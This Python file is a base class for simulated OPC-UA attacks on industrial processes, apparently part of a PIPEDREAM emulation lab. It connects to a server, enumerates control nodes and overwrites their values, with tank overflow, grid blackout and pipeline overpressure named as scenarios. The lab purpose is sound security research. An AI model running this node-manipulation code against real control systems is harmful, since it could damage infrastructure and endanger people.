#!/usr/bin/env python3
"""
Base OPC-UA Attack Class for PIPEDREAM Simulation

Provides common functionality for OPC-UA manipulation attacks.
"""

import logging
import time
import sys
from abc import ABC, abstractmethod
from typing import Dict, Any, Optional, List
from dataclasses import dataclass

# Setup logging with proper output
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger('OPCUAAttack')
logger.setLevel(logging.INFO)


@dataclass
class AttackResult:
    """Result of an attack execution"""
    success: bool
    process: str
    attack_type: str
    commands_sent: int
    nodes_modified: List[str]
    expected_effect: str
    duration: float
    error: Optional[str] = None


class OPCUAAttack(ABC):
    """
    Abstract base class for OPC-UA attacks

    Subclasses implement specific attack scenarios:
    - Water tank overflow
    - Power grid blackout
    - Gas pipeline overpressure
    """

    def __init__(self, target: str, port: int = 4840):
        """
        Initialize attack

        Args:
            target: Target OPC-UA server IP
            port: OPC-UA port
        """
        self.target = target
        self.port = port
        self.endpoint = f"opc.tcp://{target}:{port}/freeopcua/server/"

        self.client = None
        self.connected = False
        self.nodes = {}
        self.attack_start_time = None
        self.commands_sent = 0
        self.modified_nodes = []

    def connect(self) -> bool:
        """Connect to OPC-UA server"""
        try:
            from opcua import Client

            logger.info(f"[*] Connecting to {self.endpoint}...")
            self.client = Client(self.endpoint)
            self.client.connect()
            self.connected = True
            logger.warning(f"[!] Connected to OPC-UA server")

            # Setup nodes
            self._setup_nodes()

            return True

        except Exception as e:
            logger.error(f"[-] Connection failed: {e}")
            return False

    def disconnect(self):
        """Disconnect from OPC-UA server"""
        if self.client and self.connected:
            try:
                self.client.disconnect()
            except:
                pass
        self.connected = False
        logger.info("[*] Disconnected from OPC-UA server")

    def _setup_nodes(self):
        """Setup node references for the target process"""
        try:
            root = self.client.get_root_node()
            objects = root.get_child(["0:Objects"])

            process_name = self.get_process_name()
            process_node = objects.get_child([f"2:{process_name}"])

            for category in ['Measurements', 'Status', 'Alarms', 'Commands']:
                try:
                    category_node = process_node.get_child([f"2:{category}"])
                    children = category_node.get_children()

                    for child in children:
                        name = child.get_browse_name().Name
                        node_path = f"{category}.{name}"
                        self.nodes[node_path] = child

                except Exception as e:
                    logger.debug(f"Could not find {category}: {e}")

            logger.info(f"[+] Found {len(self.nodes)} nodes for {process_name}")

        except Exception as e:
            logger.error(f"[-] Node setup error: {e}")

    def read_node(self, node_path: str) -> Any:
        """Read a node value"""
        if node_path in self.nodes:
            try:
                return self.nodes[node_path].get_value()
            except Exception as e:
                logger.error(f"[-] Read error for {node_path}: {e}")
        return None

    def write_node(self, node_path: str, value: Any) -> bool:
        """Write a value to a node"""
        if node_path in self.nodes:
            try:
                from opcua import ua

                node = self.nodes[node_path]

                # Determine variant type
                if isinstance(value, bool):
                    variant = ua.DataValue(ua.Variant(value, ua.VariantType.Boolean))
                else:
                    variant = ua.DataValue(ua.Variant(float(value), ua.VariantType.Float))

                node.set_value(variant)
                self.commands_sent += 1
                self.modified_nodes.append(node_path)
                logger.info(f"[+] Wrote {node_path} = {value}")
                return True

            except Exception as e:
                logger.error(f"[-] Write error for {node_path}: {e}")
        else:
            logger.warning(f"[-] Node not found: {node_path}")
        return False

    def read_all_measurements(self) -> Dict[str, Any]:
        """Read all measurement values"""
        measurements = {}
        for path, node in self.nodes.items():
            if path.startswith('Measurements.'):
                try:
                    name = path.split('.')[1]
                    measurements[name] = node.get_value()
                except:
                    pass
        return measurements

    def read_all_status(self) -> Dict[str, Any]:
        """Read all status values"""
        status = {}
        for path, node in self.nodes.items():
            if path.startswith('Status.'):
                try:
                    name = path.split('.')[1]
                    status[name] = node.get_value()
                except:
                    pass
        return status

    @abstractmethod
    def get_process_name(self) -> str:
        """Return the target process name"""
        pass

    @abstractmethod
    def get_attack_name(self) -> str:
        """Return the attack name/type"""
        pass

    @abstractmethod
    def get_expected_effect(self) -> str:
        """Return description of expected attack effect"""
        pass

    @abstractmethod
    def execute_attack(self) -> bool:
        """
        Execute the attack

        Returns:
            True if attack executed successfully
        """
        pass

    def run(self) -> AttackResult:
        """
        Run the complete attack sequence

        Returns:
            AttackResult with execution details
        """
        self.attack_start_time = time.time()
        self.commands_sent = 0
        self.modified_nodes = []
        error = None

        logger.info("\n" + "=" * 60)
        logger.info(f"EXECUTING: {self.get_attack_name()}")
        logger.info("=" * 60)
        logger.info(f"Target: {self.endpoint}")
        logger.info(f"Process: {self.get_process_name()}")
        logger.info(f"Expected Effect: {self.get_expected_effect()}")
        logger.info("=" * 60 + "\n")

        try:
            if not self.connect():
                error = "Failed to connect"
                return self._create_result(False, error)

            # Read initial state
            logger.info("[*] Reading initial state...")
            initial_measurements = self.read_all_measurements()
            initial_status = self.read_all_status()
            logger.info(f"    Measurements: {initial_measurements}")
            logger.info(f"    Status: {initial_status}")

            # Execute attack
            logger.warning("\n[!] EXECUTING ATTACK SEQUENCE...")
            success = self.execute_attack()

            # Verify effect
            time.sleep(2)
            logger.info("\n[*] Verifying attack effect...")
            final_measurements = self.read_all_measurements()
            final_status = self.read_all_status()
            logger.info(f"    Measurements: {final_measurements}")
            logger.info(f"    Status: {final_status}")

            return self._create_result(success, error)

        except Exception as e:
            error = str(e)
            logger.error(f"[-] Attack error: {e}")
            return self._create_result(False, error)

        finally:
            self.disconnect()

    def _create_result(self, success: bool, error: Optional[str]) -> AttackResult:
        """Create attack result"""
        duration = time.time() - self.attack_start_time if self.attack_start_time else 0

        return AttackResult(
            success=success,
            process=self.get_process_name(),
            attack_type=self.get_attack_name(),
            commands_sent=self.commands_sent,
            nodes_modified=self.modified_nodes,
            expected_effect=self.get_expected_effect(),
            duration=duration,
            error=error
        )
